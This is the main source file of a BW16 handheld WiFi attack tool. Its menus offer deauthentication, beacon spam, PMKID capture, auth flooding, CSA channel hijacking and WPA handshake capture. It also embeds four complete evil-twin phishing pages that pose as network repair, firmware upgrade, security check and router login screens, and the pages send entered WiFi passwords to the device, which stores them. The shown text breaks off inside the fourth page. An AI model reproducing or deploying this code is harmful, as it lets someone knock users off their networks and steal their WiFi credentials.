#include <SPI.h>
#endif
#include <Adafruit_GFX.h>
#include <Adafruit_ILI9341.h>
#include <U8g2_for_Adafruit_GFX.h>
#include <vector>
#include <set>
#include <map>
// BW16 WiFi SDK (支持扫描/AP/去认证等)
#include <WiFi.h>
#include <WiFiServer.h>
#include <WiFiClient.h>
// BW16 平台 WiFi 头文件（wifi_scan_networks 等底层API）
#include <wifi_conf.h>
#include <wifi_structures.h>

// WiFi 自定义发包框架（DeauthFrame/BeaconFrame 结构体 + wifi_tx_raw_frame 等API）
#include "wifi_cust_tx.h"

// 攻击检测类型定义（ThreatLevel / DetectEntry / DetectStats）
// 独立 .h 确保 Arduino 预处理时类型先于自动生成的函数原型
#include "detect_types.h"

// WPA/WPA2 握手包捕获（EAPOL 解析 + PCAP 生成 + 非阻塞状态机）
#include "handshake.h"

// DNS 强制门户服务器（钓鱼攻击核心组件）
#include "DNSServer.h"

// Web 配置热点（后台管理界面）
#include "web_config.h"
#include "Web/web_admin.h"

// 混杂模式 (Promiscuous Mode) API — 帧监视器使用
extern "C" {
  int wifi_set_promisc(uint32_t enable, void (*callback)(unsigned char*, unsigned int, void*), uint8_t len);
}

// RTW 混杂模式常量（SDK wifi_conf.h 提供）
#ifndef RTW_PROMISC_ENABLE
#define RTW_PROMISC_ENABLE    1
#endif
#ifndef RTW_PROMISC_ENABLE_2
#define RTW_PROMISC_ENABLE_2  4
#endif
#ifndef RTW_PROMISC_DISABLE
#define RTW_PROMISC_DISABLE   0
#endif

// 802.11 帧类型/子类型常量
#define IEEE80211_TYPE_MGMT   0
#define IEEE80211_TYPE_CTRL   1
#define IEEE80211_TYPE_DATA   2

#define MGMT_SUBTYPE_ASSOC_REQ   0
#define MGMT_SUBTYPE_ASSOC_RESP  1
#define MGMT_SUBTYPE_REASSOC_REQ 2
#define MGMT_SUBTYPE_REASSOC_RESP 3
#define MGMT_SUBTYPE_PROBE_REQ   4
#define MGMT_SUBTYPE_PROBE_RESP  5
#define MGMT_SUBTYPE_BEACON      8
#define MGMT_SUBTYPE_DISASSOC   10
#define MGMT_SUBTYPE_AUTH       11
#define MGMT_SUBTYPE_DEAUTH     12
#define MGMT_SUBTYPE_ACTION     13

// WiFi 扫描结果结构体 — 必须放在 #include 之后、函数前向声明之前
// 否则 Arduino .ino 自动原型生成时找不到此类型
struct WiFiScanResult {
  String ssid;
  String ssid_display;   // 预截断缓存，避免每次绘制都逐字计算宽度
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint channel;
  int security_type;
};

// ==================== TFT 引脚定义 ====================
#define TFT_CS     PA15
#define TFT_DC     PA26
#define TFT_RST    PA27
#define TFT_MOSI   PA12
#define TFT_SCK    PA14
#define TFT_MISO   PA13
#define TFT_LED    PA30
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
extern const int TITLE_BAR_H = 40;  // 标题栏高度（menu_system.cpp 外部引用）

// ==================== XPT2046 触摸引脚 ====================
#define TOUCH_CS   PA25


// 屏幕亮度 (0-100, 默认100%)
static int g_brightness = 100;

// 30秒误操作自动熄屏
static int g_autoSleepSec = 30;           // 熄屏超时秒数 (0=关闭)
static int g_autoSleepOptIdx = 2;          // 当前选项索引
static unsigned long g_lastActivityMs = 0;  // 最后触摸/活动时间
static bool g_screenSleeping = false;    // 屏幕是否已熄

// 熄屏时间选项 (秒)
static const int AUTOSLEEP_OPT_COUNT = 6;
static const int autosleepOpts[] = {0, 15, 30, 60, 120, 300};
static const char* autosleepLabels[] = {"关闭", "15秒", "30秒", "60秒", "120秒", "300秒"};

// 触摸去抖机制（参考BW16-Tools，避免SPI争抢导致闪屏）
#define TOUCH_DEBOUNCE_MS  200                     // 触摸去抖时间
static unsigned long g_lastTouchTime  = 0;         // 上次触摸时间
static bool          g_touchValid     = false;     // 当前是否在去抖保持期内
static int16_t       g_cachedTx       = 0;         // 缓存的触摸坐标
static int16_t       g_cachedTy       = 0;
static int16_t       g_lastRawX       = 0;
static int16_t       g_lastRawY       = 0;

#include <EEPROM.h>

// EEPROM 校准数据存储地址与魔数
#define CALIB_EEPROM_ADDR  0
#define CALIB_MAGIC         0xA5C1
struct CalibData {
  uint16_t magic;
  int16_t  minX;
  int16_t  maxX;
  int16_t  minY;
  int16_t  maxY;
};

// ==================== 触摸区域枚举与结构体（必须在所有函数定义之前，避免Arduino自动原型报错）====================
enum AreaType { AREA_NONE, AREA_MENU, AREA_BTN_UP, AREA_BTN_DOWN, AREA_BTN_OK, AREA_BTN_BACK };
enum PopupResult { POPUP_NONE, POPUP_CONFIRM, POPUP_CANCEL };

enum WifiAreaType {
  WIFI_AREA_NONE = 0,
  WIFI_AREA_ITEM,
  WIFI_AREA_BTN_UP,
  WIFI_AREA_BTN_DOWN,
  WIFI_AREA_BTN_REFRESH,
  WIFI_AREA_BTN_OK,
  WIFI_AREA_BTN_BACK,
  WIFI_AREA_TITLE
};

struct WifiTouchResult {
  WifiAreaType area;
  int itemIndex;
};

static void saveCalibrationToEEPROM() {
  CalibData data;
  data.magic = CALIB_MAGIC;
  data.minX  = (int16_t)g_tsMinX;
  data.maxX  = (int16_t)g_tsMaxX;
  data.minY  = (int16_t)g_tsMinY;
  data.maxY  = (int16_t)g_tsMaxY;
  uint8_t* p = (uint8_t*)&data;
  for (size_t i = 0; i < sizeof(CalibData); i++) {
    EEPROM.write(CALIB_EEPROM_ADDR + i, p[i]);
  }
  EEPROM.commit();  // ★ 刷入Flash — 断电不丢失
  Serial.println("校准已保存到EEPROM (已commit)");
}

static void clearCalibrationEEPROM() {
  // 写入无效魔数以清除EEPROM校准数据
  uint8_t zero = 0;
  for (size_t i = 0; i < sizeof(CalibData); i++) {
    EEPROM.write(CALIB_EEPROM_ADDR + i, zero);
  }
  EEPROM.commit();  // ★ 刷入Flash，确保清除操作断电不丢失
  Serial.println("EEPROM校准数据已清除");
}

// 返回 true 表示从EEPROM成功加载了有效校准数据
static bool loadCalibrationFromEEPROM() {
  CalibData data;
  uint8_t* p = (uint8_t*)&data;
  for (size_t i = 0; i < sizeof(CalibData); i++) {
    p[i] = EEPROM.read(CALIB_EEPROM_ADDR + i);
  }
  if (data.magic == CALIB_MAGIC) {
    // ★ 取绝对值：触摸轴反转时 minX > maxX，差值可能为负
    Serial.print("EEPROM校准: minX="); Serial.print(data.minX);
    Serial.print(" maxX="); Serial.print(data.maxX);
    Serial.print(" minY="); Serial.print(data.minY);
    Serial.print(" maxY="); Serial.print(data.maxY);
    Serial.print(" | 范围X="); Serial.print(rangeX);
    Serial.print(" 范围Y="); Serial.println(rangeY);

    if (rangeX >= 500 && rangeY >= 500) {
      g_tsMinX = data.minX;
      g_tsMaxX = data.maxX;
      g_tsMinY = data.minY;
      g_tsMaxY = data.maxY;
      Serial.println("已从EEPROM加载触摸校准数据");
      return true;
    } else {
      Serial.println("EEPROM校准数据范围异常(过窄)，已丢弃");
      // ★ 清除后也必须 commit，否则下次重启仍读到脏数据
      clearCalibrationEEPROM();
      return false;
    }
  } else {
    Serial.println("EEPROM无有效校准数据，使用默认值(宽范围)");
    return false;
  }
}

// ==================== 硬件对象 ====================
Adafruit_ILI9341 tft = Adafruit_ILI9341(TFT_CS, TFT_DC, TFT_RST);
U8G2_FOR_ADAFRUIT_GFX u8g2_for_adafruit_gfx;

// ==================== 颜色定义 (与图片一致) ====================
#define COLOR_BG         0x18E3  // 背景深灰黑
#define COLOR_TITLE_BG   0x4010  // 标题栏深紫蓝色
#define COLOR_TITLE_TEXT 0xFFE0  // 标题亮黄色
#define COLOR_MENU_TEXT  0x07FF  // 菜单文字青色/浅蓝绿
#define COLOR_MENU_SEL   0x001F  // 选中项亮蓝色
#define COLOR_BTN_UP     0x07E0  // 上按钮 - 绿色
#define COLOR_BTN_DOWN   0x07E0  // 下按钮 - 绿色
#define COLOR_BTN_OK     0x001F  // 确认按钮 - 蓝色
#define COLOR_BTN_BACK   0xF800  // 返回按钮 - 红色
#define COLOR_BTN_BORDER 0xFFFF  // 按钮边框白
#define COLOR_POPUP_BG   0x4010  // 弹窗背景深蓝紫
#define COLOR_POPUP_TEXT 0x07FF  // 弹窗文字青色
#define COLOR_CONFIRM_BG 0x07E0  // 确认按钮绿色
#define COLOR_CANCEL_BG  0xF800  // 取消按钮红色
#define COLOR_WHITE      0xFFFF  // 纯白
#define COLOR_SIGNAL_GOOD 0x07E0  // RSSI强 绿色
#define COLOR_SIGNAL_OK   0xFFE0  // RSSI中等 黄色
#define COLOR_SIGNAL_WEAK 0xF800  // RSSI弱 红色
#define COLOR_CHK_ON      0x07E0  // 勾选标记绿色
#define COLOR_CHK_OFF     0x8410  // 未勾选灰色
#define COLOR_SEC_OPEN    0xFFFF  // OPEN白色
#define COLOR_SEC_WPA     0xFFE0  // WPA黄色
#define COLOR_SEC_WPA2    0x07E0  // WPA2绿色
#define COLOR_SEC_WEP     0xF800  // WEP红色
#define COLOR_SEC_WPA3    0x07FF  // WPA3青色
#define COLOR_ITEM_BG     0x0841  // 列表项暗色背景
#define COLOR_AREA_LINE   0x6B8F  // 功能区域边框线（浅灰蓝）
#define COLOR_ATTACK_TITLE 0xED20 // 攻击菜单标题栏橙色 (RGB565≈0xE8A400)

// ==================== 全频段信道列表（2.4G + 5G） ====================
static const int ALL_CH_LIST[] = {
  // 2.4GHz (1-14)
  1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
  // 5GHz UNII-1
  36, 40, 44, 48,
  // 5GHz UNII-2A
  52, 56, 60, 64,
  // 5GHz UNII-2C
  100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140,
  // 5GHz UNII-3
  149, 153, 157, 161, 165
};
static const int ALL_CH_COUNT = sizeof(ALL_CH_LIST) / sizeof(ALL_CH_LIST[0]);
static int g_fmChIdx = 0;  // 帧监视器的信道数组索引

// ==================== 屏幕状态 ====================
enum ScreenState { SCREEN_MAIN = 0, SCREEN_WIFI_LIST = 1, SCREEN_ATTACK_MENU = 2, SCREEN_ATTACK_RUNNING = 3, SCREEN_SETTINGS = 4, SCREEN_RADAR = 5, SCREEN_WIFI_SCANNING = 6, SCREEN_WEB_CONFIG = 7, SCREEN_DOWNLOAD_AP = 8 };
ScreenState g_screen = SCREEN_MAIN;

// 标志：弹窗内屏幕切换延迟到主循环绘制（避免嵌套调用导致栈溢出/状态混乱）
static bool g_pendingWifiDraw       = false;
static bool g_pendingAttackMenuDraw = false;
static bool g_pendingMenuDraw       = false;

// 从攻击入口进入WiFi列表的待执行攻击
static int g_pendingAttackType = -1;    // 0=deauth, 1=beacon, 2=beacon_deauth, 3=pmkid, 4=auth_flood, 5=CSA, 6=bcast_deauth, 7=channel_jam, 8=blackhole, 9=handshake, 10=phishing
static int g_wifiReturnScreen = SCREEN_MAIN;
static int g_wifiReturnMenuIdx = 0;

// 攻击子菜单状态
static int g_attackMenuIdx = 0;        // 攻击菜单选中项
static int g_prevAttackMenuIdx = 0;    // 上一次攻击菜单选中项（用于增量重绘）
static const int ATTACK_MENU_COUNT = 8;
const char* attackMenuItems[] = {
  "1. 解除身份认证攻击",
  "2. 发送信标帧攻击",
  "3. 信标帧+解除认证",
  "4. PMKID密钥捕获",
  "5. 认证关联洪水",
  "6. CSA信道劫持",
  "7. 全广播解除认证",
  "8. 《 返回 》"
};
const char* attackMenuDesc[] = {
  "发送Deauth帧\n强制目标断开WiFi",
  "广播伪造Beacon帧\n制造虚假WiFi列表",
  "Beacon+Deauth组合攻击\n双重干扰目标网络",
  "发送关联请求获取PMKID\n无需客户端在线即可捕获",
  "伪造大量认证关联请求\n耗尽目标AP连接表",
  "发送伪造信道切换公告\n诱骗客户端跳转到死信道",
  "广播FF:FF:FF:FF:FF:FF\n一帧断开AP上所有客户端",
  "返回主菜单"
};

// 主菜单滚动状态
static int g_menuScrollOffset = 0;     // 当前可见区域起始索引
static int g_prevMenuSelection = 0;    // 上一次选中项（用于增量重绘）
static int g_prevMenuScrollOffset = 0; // 上一次滚动偏移（用于增量重绘）
#define MENU_VISIBLE      11           // 一屏可见菜单项数 (244px / 22px)

// handshake.h 所需全局变量
SelectedAP _selectedNetwork;
String AP_Channel;
bool hs_sniffer_running = false;

// 攻击运行状态（移除static，handshake.h 需要感知停止请求）
volatile bool g_attackStop = false;
static int g_attackRunningType = -1;  // -1:none, 0:Deauth, 1:Beacon, 2:BC+Deauth, 3:CTS, 4:ProbeFlood, 5:Detect, 6:FrameMon, 7:Capture, 8:Phishing, 9:PMKID, 10:AuthFlood, 11:CSA, 12:BcastDeauth, 13:Blackhole, 14:WebConfig, 15:DownloadAP

// ==================== 心电图表可视化 (ECG) ====================
#define ECG_BUF_SIZE   240          // 波形缓冲区（一屏宽度）
#define ECG_GRID_X     8            // 网格左上角 X
#define ECG_GRID_Y     58           // 网格左上角 Y
#define ECG_GRID_W     (SCREEN_WIDTH - 16)  // 网格宽度 224
#define ECG_GRID_H     84           // 网格高度
#define ECG_MID_Y      (ECG_GRID_Y + ECG_GRID_H / 2)  // 中线 Y=100
static int  g_ecgBuf[ECG_BUF_SIZE]; // 环形波形数据 (0~ECG_GRID_H)
static int  g_ecgHead = 0;          // 写入位置
static int  g_ecgCount = 0;         // 已写入点数
static unsigned long g_ecgLastDraw = 0;      // 上次绘制时间
static unsigned long g_ecgAttackStart = 0;   // 攻击开始时间
static unsigned long g_ecgTotalPkts = 0;     // 总发包数
static unsigned long g_ecgLastPkts = 0;      // 上次发包数（计算PPS用）
static unsigned long g_ecgLastPPSms = 0;     // 上次PPS计算时间
static int  g_ecgCurPPS = 0;                 // 当前PPS速率
static int  g_ecgMaxVal = 80;                // 波形最大显示值（自适应）
static const char* g_ecgTitle = "";          // 当前攻击标题

// ==================== 检测心电图 (Detect ECG) ====================
#define DET_ECG_BUF_SIZE 240
#define DET_ECG_GRID_X   5
#define DET_ECG_GRID_Y   54
#define DET_ECG_GRID_W   230
#define DET_ECG_GRID_H   66
static int  g_detEcgBuf[DET_ECG_BUF_SIZE];   // 检测波形缓冲区
static int  g_detEcgHead = 0;
static int  g_detEcgCount = 0;
static int  g_detEcgMaxVal = 10;             // Y轴上限（AP数/威胁数），自适应
static unsigned long g_detEcgLastDraw = 0;
static bool g_detEcgInited = false;

// ==================== 钓鱼攻击 全局变量 ====================
WiFiServer phishingWebServer(80);
DNSServer   phishingDnsServer;
bool        phishingActive      = false;
bool        phishingPasswordRcvd = false;
bool        phishingPwdVerified  = false;
bool        phishingPwdSuccess   = false;
String      phishingCapturedPwd  = "";
// 异步验证：密码捕获后，先响应客户端再在主循环中验证
bool        phishingNeedsVerify  = false;
String      phishingVerifyPwd    = "";

// ==================== Web配置热点 全局变量 ====================
WiFiServer  g_webConfigServer(WEB_SERVER_PORT);
DNSServer   g_webConfigDnsServer;
bool        g_webConfigRunning = false;
bool        g_webConfigApUp    = false;

// ==================== 抓包下载热点 (BW16-WebTest) 全局变量 ====================
WiFiServer  g_downloadServer(WEB_SERVER_PORT);
DNSServer   g_downloadDnsServer;
bool        g_downloadApRunning = false;
bool        g_downloadApUp      = false;

// 验证状态供页面JS轮询: -1=无, 0=验证中, 1=成功, 2=失败
int         phishingVerifyStatus = -1;
String      phishingTargetSSID   = "";
uint8_t     phishingTargetBSSID[6] = {0};
int         phishingTargetChannel = 1;
int         g_phishPageType = 0;   // 0=网络修复, 1=固件升级, 2=安全认证, 3=路由器管理

// 密码存储
#define PHISH_MAX_PASSWORDS    20
#define PHISH_EEPROM_MAGIC     0x7B01
#define PHISH_EEPROM_ADDR      0x200

// 亮度 EEPROM
#define BRIGHTNESS_EEPROM_ADDR  0x100
#define BRIGHTNESS_EEPROM_MAGIC 0xB007

// 自动熄屏 EEPROM
#define AUTO_SLEEP_EEPROM_ADDR  0x110
#define AUTO_SLEEP_EEPROM_MAGIC 0xC001
struct PhishPassword {
  char ssid[33];
  char password[64];
  bool verified;
  unsigned long timestamp;
};
PhishPassword phishPasswords[PHISH_MAX_PASSWORDS];
int phishPasswordCount = 0;

// 钓鱼页面 HTML
const char PHISH_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>网络修复</title>
<style>body{font-family:Arial,sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{width:90%;max-width:360px;background:#1e1e1e;border:1px solid #333;border-radius:12px;padding:20px;text-align:center}
h1{font-size:18px;margin:0 0 8px 0;color:#f27474} p{color:#888;margin:0 0 16px 0}
input[type=text]{width:100%;padding:10px;border-radius:6px;border:1px solid #444;background:#111;color:#fff;box-sizing:border-box}
button{width:100%;margin-top:12px;padding:10px 14px;border:0;border-radius:6px;background:#f27474;color:#fff;cursor:pointer;font-size:15px}
button:disabled{background:#555;cursor:not-allowed}
.muted{color:#666;font-size:12px;margin-top:10px}
#progress{display:none;margin:12px 0 4px;background:#333;border-radius:6px;height:8px;overflow:hidden}
#bar{width:0%;height:100%;background:#f27474;transition:width 1s linear}
</style></head><body><div class="card">
<h1 id="wl">! 网络出现错误</h1><p>请验证 WiFi 密码进行修复</p>
<p id="ssidDisp" style="color:#03a9f4;font-size:14px">SSID: %SSID%</p>
<input id="pass" type="text" placeholder="输入WiFi密码" maxlength="64" minlength="8" oninput="c()">
<button id="btn" onclick="s()" disabled>开始修复</button>
<div id="progress"><div id="bar"></div></div>
<div id="pct" style="display:none;text-align:center;color:#888;font-size:12px">0%</div>
<div class="muted">连接后将自动恢复正常网络</div>
<div id="st" style="display:none;margin-top:12px;color:#ff0"></div>
</div><script>
function $(s){return document.getElementById(s)}
function c(){var v=$('pass').value.trim();$('btn').disabled=v.length<8}
function s(){var p=$('pass').value.trim();if(p.length<8)return;
$('btn').disabled=!0;$('btn').textContent='修复中...';
$('st').style.display='block';$('st').textContent='正在升级固件，请勿关闭本页面...';$('st').style.color='#ff0';
$('progress').style.display='block';$('pct').style.display='block';
$('pass').disabled=!0;
var x=new XMLHttpRequest();x.open('GET','./wifi?password='+encodeURIComponent(p),!0);
x.onreadystatechange=function(){if(x.readyState==4){
if(x.status==200&&x.responseText=='1'){
var t=0,m=90,cid,pid;
pid=setInterval(function(){t++;var pc=Math.floor(t*100/m);
$('bar').style.width=pc+'%';$('pct').textContent=pc+'%'+' '+"剩余 "+(m-t)+"s";
if(t>=m){clearInterval(pid);clearInterval(cid);
$('st').textContent='升级超时，请重新输入密码';$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='开始修复';$('pass').disabled=!1;$('pass').value='';}
},1000);
cid=setInterval(function(){var c=new XMLHttpRequest();c.open('GET','./check',!0);
c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){
var r=c.responseText.trim();
if(r=='1'){clearInterval(pid);clearInterval(cid);
$('bar').style.width='100%';$('pct').textContent='100%';
$('st').textContent='升级成功！网络已恢复';$('st').style.color='#4caf50';
$('progress').style.display='none';$('pct').style.display='none';}
else if(r=='2'){clearInterval(pid);clearInterval(cid);
$('st').textContent='密码错误，请重新输入';$('st').style.color='#ff0';
$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='开始修复';$('pass').disabled=!1;$('pass').value='';}
}};c.send();},2000);
}
else{$('st').textContent='连接失败，请重试';$('btn').disabled=!1;$('btn').textContent='开始修复';$('pass').disabled=!1;$('pass').value='';}}};
x.send()}
</script></body></html>
)rawliteral";

// 页面类型2: 路由器固件升级
const char PHISH_HTML2[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>固件升级</title>
<style>body{font-family:Arial,sans-serif;background:#0a1628;color:#cfd8dc;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{width:90%;max-width:380px;background:#13233a;border:1px solid #2a4560;border-radius:10px;padding:24px;text-align:center}
h1{font-size:18px;margin:0 0 4px 0;color:#ff9800} .sub{color:#78909c;font-size:12px;margin:0 0 16px 0}
.logo{font-size:40px;margin-bottom:8px}
input[type=password]{width:100%;padding:10px;border-radius:6px;border:1px solid #2a4560;background:#0a1628;color:#cfd8dc;box-sizing:border-box;text-align:center}
button{width:100%;margin-top:14px;padding:10px;border:0;border-radius:6px;background:#ff9800;color:#0a1628;cursor:pointer;font-size:15px;font-weight:bold}
button:disabled{background:#37474f;color:#78909c;cursor:not-allowed}
.muted{color:#546e7a;font-size:11px;margin-top:12px}
#progress{display:none;margin:12px 0 4px;background:#1a3040;border-radius:6px;height:8px;overflow:hidden}
#bar{width:0%;height:100%;background:#ff9800;transition:width 1s linear}
</style></head><body><div class="card">
<div class="logo">&#9881;</div>
<h1>路由器固件升级</h1><p class="sub">检测到 %SSID% 有新版本固件可用</p>
<input id="pass" type="password" placeholder="输入管理员密码以继续" maxlength="64" minlength="8" oninput="c()">
<button id="btn" onclick="s()" disabled>开始升级</button>
<div id="progress"><div id="bar"></div></div>
<div id="pct" style="display:none;text-align:center;color:#78909c;font-size:12px">0%</div>
<div class="muted">请输入路由器管理员密码验证身份</div>
<div id="st" style="display:none;margin-top:12px;color:#ff9800"></div>
</div><script>
function $(s){return document.getElementById(s)}
function c(){var v=$('pass').value.trim();$('btn').disabled=v.length<8}
function s(){var p=$('pass').value.trim();if(p.length<8)return;
$('btn').disabled=!0;$('btn').textContent='升级中...';
$('st').style.display='block';$('st').textContent='正在升级固件，请勿关闭本页面...';$('st').style.color='#ff9800';
$('progress').style.display='block';$('pct').style.display='block';
$('pass').disabled=!0;
var x=new XMLHttpRequest();x.open('GET','./wifi?password='+encodeURIComponent(p),!0);
x.onreadystatechange=function(){if(x.readyState==4){
if(x.status==200&&x.responseText=='1'){
var t=0,m=90,cid,pid;
pid=setInterval(function(){t++;var pc=Math.floor(t*100/m);
$('bar').style.width=pc+'%';$('pct').textContent=pc+'%'+' '+"剩余 "+(m-t)+"s";
if(t>=m){clearInterval(pid);clearInterval(cid);
$('st').textContent='固件升级超时，请重新输入密码';$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='开始升级';$('pass').disabled=!1;$('pass').value='';}
},1000);
cid=setInterval(function(){var c=new XMLHttpRequest();c.open('GET','./check',!0);
c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){
var r=c.responseText.trim();
if(r=='1'){clearInterval(pid);clearInterval(cid);
$('bar').style.width='100%';$('pct').textContent='100%';
$('st').textContent='固件升级成功！设备将自动重启';$('st').style.color='#4caf50';
$('progress').style.display='none';$('pct').style.display='none';}
else if(r=='2'){clearInterval(pid);clearInterval(cid);
$('st').textContent='密码错误，请重新输入';$('st').style.color='#ff9800';
$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='开始升级';$('pass').disabled=!1;$('pass').value='';}
}};c.send();},2000);
}
else{$('st').textContent='连接失败，请重试';$('btn').disabled=!1;$('btn').textContent='开始升级';$('pass').disabled=!1;$('pass').value='';}}};
x.send()}
</script></body></html>
)rawliteral";

// 页面类型3: 安全认证
const char PHISH_HTML3[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>安全认证</title>
<style>body{font-family:Arial,sans-serif;background:#0d1b0d;color:#c8e6c9;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{width:90%;max-width:370px;background:#1a2e1a;border:1px solid #2e7d32;border-radius:14px;padding:22px;text-align:center}
h1{font-size:18px;margin:0 0 6px 0;color:#4caf50} .sub{color:#81c784;font-size:12px;margin:0 0 18px 0}
.icon{font-size:44px;margin-bottom:6px}
input[type=password]{width:100%;padding:10px;border-radius:8px;border:1px solid #2e7d32;background:#0d1b0d;color:#c8e6c9;box-sizing:border-box;text-align:center}
button{width:100%;margin-top:14px;padding:10px;border:0;border-radius:8px;background:#4caf50;color:#fff;cursor:pointer;font-size:15px;font-weight:bold}
button:disabled{background:#2e3b2e;color:#6b8b6d;cursor:not-allowed}
.muted{color:#558b2f;font-size:11px;margin-top:12px}
#progress{display:none;margin:12px 0 4px;background:#1a2e1a;border-radius:6px;height:8px;overflow:hidden}
#bar{width:0%;height:100%;background:#4caf50;transition:width 1s linear}
</style></head><body><div class="card">
<div class="icon">&#128737;</div>
<h1>网络安全认证</h1><p class="sub">WiFi %SSID% 需要重新安全认证</p>
<input id="pass" type="password" placeholder="请输入WiFi密码完成认证" maxlength="64" minlength="8" oninput="c()">
<button id="btn" onclick="s()" disabled>认证连接</button>
<div id="progress"><div id="bar"></div></div>
<div id="pct" style="display:none;text-align:center;color:#81c784;font-size:12px">0%</div>
<div class="muted">此认证由网络安全防护系统发起</div>
<div id="st" style="display:none;margin-top:12px;color:#66bb6a"></div>
</div><script>
function $(s){return document.getElementById(s)}
function c(){var v=$('pass').value.trim();$('btn').disabled=v.length<8}
function s(){var p=$('pass').value.trim();if(p.length<8)return;
$('btn').disabled=!0;$('btn').textContent='认证中...';
$('st').style.display='block';$('st').textContent='正在进行安全认证，请勿关闭页面...';$('st').style.color='#66bb6a';
$('progress').style.display='block';$('pct').style.display='block';
$('pass').disabled=!0;
var x=new XMLHttpRequest();x.open('GET','./wifi?password='+encodeURIComponent(p),!0);
x.onreadystatechange=function(){if(x.readyState==4){
if(x.status==200&&x.responseText=='1'){
var t=0,m=90,cid,pid;
pid=setInterval(function(){t++;var pc=Math.floor(t*100/m);
$('bar').style.width=pc+'%';$('pct').textContent=pc+'%'+' '+"剩余 "+(m-t)+"s";
if(t>=m){clearInterval(pid);clearInterval(cid);
$('st').textContent='认证超时，请重新输入密码';$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='认证连接';$('pass').disabled=!1;$('pass').value='';}
},1000);
cid=setInterval(function(){var c=new XMLHttpRequest();c.open('GET','./check',!0);
c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){
var r=c.responseText.trim();
if(r=='1'){clearInterval(pid);clearInterval(cid);
$('bar').style.width='100%';$('pct').textContent='100%';
$('st').textContent='认证成功！网络已通过安全检查';$('st').style.color='#4caf50';
$('progress').style.display='none';$('pct').style.display='none';}
else if(r=='2'){clearInterval(pid);clearInterval(cid);
$('st').textContent='密码错误，请重新输入';$('st').style.color='#ff9800';
$('progress').style.display='none';$('pct').style.display='none';
$('btn').disabled=!1;$('btn').textContent='认证连接';$('pass').disabled=!1;$('pass').value='';}
}};c.send();},2000);
}
else{$('st').textContent='连接失败，请重试';$('btn').disabled=!1;$('btn').textContent='认证连接';$('pass').disabled=!1;$('pass').value='';}}};
x.send()}
</script></body></html>
)rawliteral";

// 页面类型4: 路由器管理登录 (模仿常见品牌路由器界面)
const char PHISH_HTML4[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>路由器管理</title>
<style>body{font-family:'Microsoft YaHei',Arial,sans-serif;background:#f0f2f5;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0}
.card{width:90%;max-width:360px;background:#fff;border-radius:8px;box-shadow:0 2px 12px rgba(0,0,0,.15);padding:30px 24px;text-align:center}
.logo{font-size:22px;font-weight:700;color:#1a73e8;margin-bottom:4px} .ver{font-size:11px;color:#999;margin-bottom:18px}
.form-group{margin-bottom:14px;text-align:left}
label{display:block;font-size:13px;color:#555;margin-bottom:4px}
input[type=password]{width:100%;padding:10px 12px;border:1px solid #d9d9d9;border-radius:4px;font-size:14px;box-sizing:border-box;transition:border .3s}
input:focus{outline:none;border-color:#1a73e8;box-shadow:0 0 0 2px rgba(26,115,232,.2)}
button{width:100%;margin-top:8px;padding:10px;border:0;border-radius:4px;background:#1a73e8;color:#fff;font-size:15px;cursor:pointer;transition:background .3s}
button:hover{background:#1557b0} button:disabled{background:#b0bec5;cursor:not-allowed}
.muted{color:#999;font-size:11px;margin-top:12px}
.alert{display:none;margin-top:10px;padding:8px;border-radius:4px;font-size:13px}
.alert-err{background:#ffebee;color:#c62828;border:1px solid #ffcdd2}
.alert-ok{background:#e8f5e9;color:#2e7d32;border:1px solid #c8e6c9}
#ssidDisp{color:#1a73e8;font-size:13px;margin-bottom:14px}
#progress{display:none;margin:10px 0 4px;background:#e8e8e8;border-radius:4px;height:8px;overflow:hidden}
#bar{width:0%;height:100%;background:#1a73e8;transition:width 1s linear}
</style></head><body><div class="card">
<div class="logo">路由器管理</div><div class="ver">v2.5.1 | 安全登录</div>
<div id="ssidDisp">SSID: %SSID%</div>
<div class="form-group"><label>管理密码</label>
<input id="pass" type="password" placeholder="请输入路由器管理密码" maxlength="64" minlength="6" oninput="c()"></div>
<button id="btn" onclick="s()" disabled>登  录</button>
<div id="progress"><div id="bar"></div></div>
<div id="pct" style="display:none;text-align:center;color:#999;font-size:12px">0%</div>
<div class="muted">请输入设备底部的管理密码</div>
<div id="st" class="alert alert-err"></div>
</div><script>
function $(s){return document.getElementById(s)}
function c(){var v=$('pass').value.trim();$('btn').disabled=v.length<6}
function s(){var p=$('pass').value.trim();if(p.length<6)return;
$('btn').disabled=!0;$('btn').textContent='登录中...';
$('st').style.display='block';$('st').textContent='正在进行固件升级，预计90秒，请勿关闭页面...';$('st').className='alert alert-err';
$('progress').style.display='block';$('pct').style.display='block';
$('pass').disabled=!0;
var x=new XMLHttpRequest();x.open('GET','./wifi?password='+encodeURIComponent(p),!0);
x.onreadystatechange=function(){if(x.readyState==4){
if(x.status==200&&x.responseText=='1'){
var t=0,m=90,cid,pid;
pid=setInterval(function(){t++;var pc=Math.floor(t*100/m);
$('bar').style.width=pc+'%';$('pct').textContent=pc+'%'+' '+"剩余 "+(m-t)+"s";
if(t>=m){clearInterval(pid);clearInterval(cid);
